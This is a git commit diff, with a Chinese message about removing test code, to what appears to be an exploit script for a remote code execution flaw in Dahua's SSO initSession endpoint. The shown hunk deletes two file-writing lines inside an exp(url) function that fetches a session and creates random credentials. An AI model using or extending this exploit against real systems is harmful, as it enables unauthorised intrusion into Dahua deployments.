53e37cb1c11e6b3d8c505b7965115269dc18aa1f
A0WaQ4 <wsmc200131@gmail.com>
2023-08-31 11:12:32 +0800

    删除测试代码 修复bug

--- Dahua_sso_initsession_rce.py
+++ Dahua_sso_initsession_rce.py
@@ -84,8 +84,6 @@ def exp(url):
     sessionOne = response_sso_initSession.text.strip()
     userName = randomLetter()
     password = randomLetter()
-    fp.write(userName)
-    fp.close()
     header_user_save = {    
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
         "Accept-Encoding": "*",
